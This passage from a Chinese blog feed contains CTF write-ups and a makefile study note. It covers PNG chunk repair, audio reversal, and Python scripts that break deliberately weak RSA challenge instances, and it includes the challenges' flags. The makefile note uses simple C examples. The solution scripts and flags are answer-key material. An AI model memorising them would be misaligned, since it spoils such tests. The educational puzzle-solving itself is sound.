punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>   <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.zip'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> g<span class="token punctuation">:</span>      g<span class="token punctuation">.</span>write<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>原先的压缩包解压后有一张图片：<code>TENTE.png</code>，用010editor打开，显示chunk[4]出错，找到该数据块，为IDAT数据块</p><p>根据提示：图片修复需要改某个chunk长度</p><p>查看该数据块的同时，发现明显没有chunk[5]的数据块符号，所以猜测是chunk[4]的长度被改小了，导致该数据库提前结束，所以<code>TENTE.png</code>图片下方是透明的</p><p><img src="https://z3.ax1x.com/2021/04/09/cUrbwV.png"></p><p>查了下可以知道IDAT数据块与其它IDAT数据块相连，在010editor搜索IDAT，发现有另一个IDAT在chunk[4]结束之后，据此计算chunk[4]的正确长度</p><p><img src="https://z3.ax1x.com/2021/04/09/cUrHe0.png"></p><p><img src="https://z3.ax1x.com/2021/04/09/cUrqoT.png"></p><pre class="line-numbers language-none"><code class="language-none">23C43-1341-4-4-4&#x3D;228F6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中</p><p>第一个<code>4</code>为<code>IDAT</code>的字节数：4个字节</p><p>第二个<code>4</code>为chunk[5]的长度，占4个字节</p><p>第二个<code>4</code>为chunk[4]的crc校验码，也是4个字节</p><p>由此图片修改正确，显示出下面透明的部分</p><p><img src="https://z3.ax1x.com/2021/04/09/cUrXYF.png"></p><p><img src="https://z3.ax1x.com/2021/04/09/cUsyp4.png"></p><pre class="line-numbers language-none"><code class="language-none">677a6d7475<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解压压缩包得到<code>flag.wav</code></p><p>根据提示：音乐最后网易云识别</p><p>以及图片上的字：信条，用Audacity将<code>flag.wav</code>倒放</p><p>CTRL + A 全选，点击“效果” –&gt; “反向（时间）”</p><p>然后用网易云识别歌曲，在评论找到flag</p><img src="https://z3.ax1x.com/2021/04/09/cUrjW4.jpg" style="zoom:40%;" /><img src="https://z3.ax1x.com/2021/04/09/cUrzl9.jpg" style="zoom:40%;" /><pre class="line-numbers language-none"><code class="language-none">flag&#123;034d7bac-92b2-11eb-9310-00163e12fb24&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h4><p>已知c、e、n1、n2，只要能够分解n1，就能够拿到flag</p><p>在题目中n1和n2共用一个大质数p，所以n1和n2的最大公因数即为p，这样就能分解n1了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">65537</span>n1 <span class="token operator">=</span> <span class="token number">19927995886914135335416406082647120895619334038709715664270614604151473749182691765161766917756826761209408429340053534661116540440455731883912107733536490306892185777306017692334819486621137392115368637822832208615896079869167332092773633150006570996052837028257313679389522817781164233607188350606757597836490056930318266077647703629309920052447748365274174530490094908252256551706625163193805930254664728936230312618043386165963458944225026036816776258340041222542638064896328642143272486093326421275373201421890802797828158807121957406664052135737278317985129996476960525575320786302386904366901933941877871977923</span>n2 <span class="token operator">=</span> <span class="token number">18891582332322922179757256935338383228362622765536723954262749118724360227437890613511811834258619933112000032816774390665802252670355559592889246899049387975273869584023100438870426265843757686044290924963164327025399130980205072334359825236874676865799829315906270559180981769846264222745663893031262917781276708151305378259082579089031371101323253330053986819164120184785001094503410745573822883437760154804937523455385157947633996347870180978374764506128842545299334183115882288528664242409706229889871455032394406814666870814759869179655535890356720047754561351306758635949531548031922969386197250253432717160713</span>c <span class="token operator">=</span> <span class="token number">13464724434881083014378360688491414344998156133411847847874051353940035862995104112542330206199732554180770508723141951625606376158124527681508374976085150535523169426812879850201999337951347258663163526945777620586135979743047015305904146804741356004618021619877806139998460893541631182931447449498967591502111403371136690476476964569301404706879044022446236796126968424261474149501366709514040581812492269780027443526915046387838380291031527967274048028552563236517463115042981801314702717397461735551656092225777678039402709019728332707310411968980746101194493745338399939010674127078293589259391068943187148009190</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>q <span class="token operator">=</span> n1<span class="token operator">//</span>pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>flag</li></ul><pre class="line-numbers language-none"><code class="language-none">flag&#123;u5e_the_s4me_p&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h4 id="数学很重要"><a href="#数学很重要" class="headerlink" title="数学很重要"></a>数学很重要</h4><p>需要分解n，得到p和q，才能拿到m，即flag</p><p>在题目中有：<code>d = gmpy2.invert(e, p*(p-1)*(q-1))</code></p><p>由此来推导模数n的分解：</p><p><img src="https://z3.ax1x.com/2021/04/09/cUysVP.png"></p><p>至此可以分解<code>n = p * p * q</code>，进而求出<code>m</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumn <span class="token operator">=</span> <span class="token number">1404864792885309108733640159316826506894236287548379939152849016743435983442699747921846125787195996033503870282773818470039914142701705451809138397049630572740639249477647644261254708528772540978792294225346035639261591427432057453936860038832354440430427494151140007167188185298912810715582637875006928402468687609650245843893636726667943630230916699610263246417106899540475644300775129490776223094431047266427439282518682724978986466077711523145747674327332051810519026006226118101950866725315377926329640394039034742537816196415220996830129516878556074570587486143579684121551028517709279020939236578960627017120428642424734081608822839438555638805913188881032407815526804750217289667978469999465893012019987646121081067553285784264938579036090518539835310642939403312387248525506990916704179728785567091817175793341264114889237623098808526580508172221259938132204690459668424325728699548951520597516996306695162612026923</span>c <span class="token operator">=</span> <span class="token number">1056621132858553337843799531931829780532909526893598349757065810082614861897005399538516022339385456921080981930134553531451997667616780694476473935635850906657287327947505250813121839115712839784961838878589687696392168999007259428943177170885096149257761111375426947276207008555385135699868532336069097451167698609146202623839343749042437332344304731408930972252319186875629139934202497457999728524999876011248799301721947182662277983045924969387711620125568428544081394563081888004751018879893766348092204921968270651820590342957624989796768741978229821705472159840676453778980085893882942690791813978120574188104366811115515943434915719899354094207665657376073518852691150218789684229024823845100939031274257318172046382806032216330957494501967155244691377918879968703887945579606252867891939345438276905409978552743142300094751510214632116779662364652019422074762160221347591144466572300812675526052926724548943468469723</span>hint <span class="token operator">=</span> <span class="token number">101794688716785217887960897945591243956989900037427176767666512559791995985108215779421011313213384758689708929722203071477840953013038647100924911493828188106127504843466854689586463951519895573419515062134362771498167243657486890676780200214663789335950289873729808283135837361560831229580803000690276177751767706193356374011845264745277604824551554541736615017289493676579496259064630875246918064858049304827949231835533001170204905788972411679518681180136352305431808979840858420025675441100205234779010351872551760580862818923553046506121627173411616799109177911982734522304097798381596915860520993100826264630451736911320052426159472868988436162344618566093403661349180934448297588983261629039054368903969451215957019928944985865422734016492501757272819066148585342366043951355199543153844023840418108988483011676230567828688205989252493165991940377092334291423942549979314542332470846061006424871389380351025361150311</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> e<span class="token punctuation">)</span> <span class="token operator">*</span> hint <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span>q <span class="token operator">=</span> n <span class="token operator">//</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>phi <span class="token operator">=</span> p<span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>flag</li></ul><pre class="line-numbers language-none"><code class="language-none">flag&#123;Mathematics_is_very_important!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记——makefile</title>
      <link href="posts/20210323.html"/>
      <url>posts/20210323.html</url>
      
        <content type="html"><![CDATA[<p>Linux makefile学习笔记</p><span id="more"></span><p>先准备3个文件</p><p><img src="https://z3.ax1x.com/2021/04/09/cURdB9.png"></p><ul><li>print.h</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">printhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>print.c</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"print.h"</span></span><span class="token keyword">void</span> <span class="token function">printhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, world\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>main.c</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"print.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>makefile 规则：</p><pre class="line-numbers language-none"><code class="language-none">target...:prerequisites...command（命令行必须前面加一个“Tab”键）...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>target就是一个目标文件，可以是Object File、可执行文件、一个标签（Label）等。</p><p>prerequisites就是要生成那个target所需要的文件或是目标，文件之间用空格隔开。</p><p>command就是make需要执行的任意Shell命令，命令行必须由“Tab”键开头。</p><p>这是一个文件的依赖关系，target这一个或多个的目标文件依赖于prerequisites中的文件，其生成规则定义在command中。</p><p>prerequisites中如果有一个以上的文件比target文件要新的话，command所定义的命令就会被执行。这就是Makefile的规则，也是最核心的内容。</p><br><h3 id="makefile-1"><a href="#makefile-1" class="headerlink" title="makefile_1"></a>makefile_1</h3><ul><li>makefile</li></ul><pre class="line-numbers language-none"><code class="language-none">helloworld: main.o print.ogcc -o helloworld main.o print.omain.o: maic.c print.hgcc -c main.cprint.o: print.c print.hgcc -c print.cclean:rm helloworld main.o print.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/09/cURDtx.png"></p><p>在命令行输入<code>make</code>，然后执行生成的可执行文件<code>helloworld</code>，最后执行makefile的clean部分</p><p><img src="https://z3.ax1x.com/2021/04/09/cURrh6.png"></p><br><h3 id="makefile-2"><a href="#makefile-2" class="headerlink" title="makefile_2"></a>makefile_2</h3><ul><li>makefile</li></ul><pre class="line-numbers language-none"><code class="language-none">objects &#x3D; main.o print.ohelloworld: $(objects)gcc -o helloworld $(objects)main.o: main.c print.hgcc -c main.cprint.o: print.c print.hgcc -c print.cclean:rm helloworld $(objects)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/09/cURw7R.png"></p><br><h3 id="makefile-3"><a href="#makefile-3" class="headerlink" title="makefile_3"></a>makefile_3</h3><ul><li>makefile</li></ul><pre class="line-numbers language-none"><code class="language-none">objects &#x3D; main.o print.ohelloworld: $(objects)gcc -o helloworld $(objects)$(objects): print.hmain.o: main.cprint.o: print.cclean:rm helloworld $(objects)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/09/cURBA1.png"></p><br><h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><ul><li>factorial.c</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">factorial</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> n<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>main.c</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">factorial</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s n\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        n <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Factorial of %d is %d.\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这里先了解下main函数的参数</p><pre class="line-numbers language-none"><code class="language-none">main(int argc,char* argv[])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>argc：参数个数</li><li>argv：参数列表</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"argv[%d] = %s\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们在当前文件打开终端，执行命令</p><pre class="line-numbers language-none"><code class="language-none">test.exe 123 abcd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>终端输出：</p><pre class="line-numbers language-none"><code class="language-none">argv[0] &#x3D; test.exeargv[1] &#x3D; 123argv[2] &#x3D; abcd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><p>atoi函数</p><pre class="line-numbers language-none"><code class="language-none">头文件：#include &lt;stdlib.h&gt;atoi() 函数用来将字符串转换成整数(int)，其原型为：int atoi (const char * str);【函数说明】atoi() 函数会扫描参数 str 字符串，跳过前面的空白字符（例如空格，tab缩进等，可以通过 isspace() 函数来检测），直到遇上数字或正负符号才开始做转换，而再遇到非数字或字符串结束时(&#39;\0&#39;)才结束转换，并将结果返回。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>编写程序<code>factorial</code>的makefile文件</p><ul><li>makefile</li></ul><pre class="line-numbers language-none"><code class="language-none">factorial: main.o factorial.ogcc -o factorial main.o factorial.omain.o: main.cgcc -c main.cfactorial.o: factorial.cgcc -c factorial.cclean:rm factorial main.o factorial.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/09/cURy9K.png"></p><p>没有相应函数的库文件</p><p>修改<code>main.c</code>和<code>factorial.c</code></p><ul><li>main.c</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">factorial</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s n\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        n <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Factorial of %d is %d.\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>factorial.c</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">factorial</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> n<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再次运行</p><p><img src="https://z3.ax1x.com/2021/04/09/cUR61O.png"></p><p>对<code>makefile</code>进行改进</p><ul><li>makefile</li></ul><pre class="line-numbers language-none"><code class="language-none">objects &#x3D; main.o factorial.ofactorial: $(objects)gcc -o factorial $(objects)main.o: main.cfactorial.o: factorial.cclean:rm factorial $(objects)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/09/cURccD.png"></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2021-crypto-whitegive</title>
      <link href="posts/20210321.html"/>
      <url>posts/20210321.html</url>
      
        <content type="html"><![CDATA[<p>RSA套娃</p><span id="more"></span><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>VNCTF2021 - Crypto - whitegive.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> url<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>url<span class="token punctuation">)</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qd <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>e <span class="token operator">=</span> inverse<span class="token punctuation">(</span>d<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>m <span class="token operator">=</span> ep <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> p <span class="token operator">*</span> qe <span class="token operator">=</span> <span class="token number">0x10001</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span>lcm<span class="token punctuation">(</span>p<span class="token punctuation">,</span>lcm<span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>hint <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hint<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441861433117883636756846741136991930467817966389132430161525555721508581595005276740637546945145019997918755611429251549910005326287991856084650628145461081604344680988980407690210720073741565463149752405833474680260016336529404087791555793394709605710676529248146233711779010523020052891553050895882042043132611246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684'''</span><span aria-hidden="true" 